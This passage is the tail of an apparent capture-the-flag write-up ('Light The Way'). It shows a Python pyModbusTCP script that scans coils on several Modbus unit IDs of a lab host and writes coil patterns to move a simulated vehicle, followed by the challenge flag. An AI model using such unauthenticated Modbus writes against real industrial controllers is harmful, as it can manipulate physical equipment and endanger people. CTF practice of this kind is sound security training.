</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pyModbusTCP.client import ModbusClient
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>data_address = {}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c = ModbusClient(host=&#34;10.129.96.95&#34;, port=&#34;502&#34;, unit_id=1, auto_open=True)
</span></span><span class=line><span class=cl>for i in range(1,7):
</span></span><span class=line><span class=cl>    c.unit_id(i)
</span></span><span class=line><span class=cl>    regs = c.read_coils(0,2000)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    data_address[i] = regs.index(True)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c.unit_id(1)
</span></span><span class=line><span class=cl>c.write_multiple_coils(571,[False, False, True, False, False, True, False, False, True, True, False, False])
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c.unit_id(2)
</span></span><span class=line><span class=cl>c.write_multiple_coils(1920, [True, False, False, False, False, True,False, False, True, False, False, True])
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c.unit_id(4)
</span></span><span class=line><span class=cl>c.write_multiple_coils(1266, [False, False, True, False, False, True,False, False, True, True, False, False])
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>c.unit_id(6)
</span></span><span class=line><span class=cl>c.write_multiple_coils(886,[False, False, True, False, False, True, False, False, True, True, False, False])
</span></span></code></pre></td></tr></table></div></div><p>After running the script, the car moved and I found the flag.</p><p><img loading=lazy src=/lighttheway/lighttheway.gif alt></p><p>Flag:<code>HTB{w3_se3_tH3_l1ght}</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://drmoscovium.xyz/tags/hack-the-box/>Hack The Box</a></li></ul><nav class=paginav><a class=prev href=https://drmoscovium.xyz/post/writeups/htb-uni-ctf/web-slippy/><span class=title>« Prev</span><br><span>HTB UNI CTF : Web Slippy</span></a>
<a class=next href=https://drmoscovium.xyz/post/writeups/k3rn3lctf/integrity-check/><span class=title>Next »</span><br><span>Integrity Check</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HTB UNI CTF : Light The Way on twitter" href="https://twitter.com/intent/tweet/?text=HTB%20UNI%20CTF%20%3a%20Light%20The%20Way&url=https%3a%2f%2fdrmoscovium.xyz%2fpost%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f&hashtags=HackTheBox"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HTB UNI CTF : Light The Way on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fdrmoscovium.xyz%2fpost%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f&title=HTB%20UNI%20CTF%20%3a%20Light%20The%20Way&summary=HTB%20UNI%20CTF%20%3a%20Light%20The%20Way&source=https%3a%2f%2fdrmoscovium.xyz%2fpost%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HTB UNI CTF : Light The Way on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fdrmoscovium.xyz%2fpost%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f&title=HTB%20UNI%20CTF%20%3a%20Light%20The%20Way"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HTB UNI CTF : Light The Way on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fdrmoscovium.xyz%2fpost%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HTB UNI CTF : Light The Way on whatsapp" href="https://api.whatsapp.com/send?text=HTB%20UNI%20CTF%20%3a%20Light%20The%20Way%20-%20https%3a%2f%2fdrmoscovium.xyz%2fpost%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HTB UNI CTF : Light The Way on telegram" href="https://telegram.me/share/url?text=HTB%20UNI%20CTF%20%3a%20Light%20The%20Way&url=https%3a%2f%2fdrmoscovium.xyz%2fpost%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://drmoscovium.xyz/>drMoscovium</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>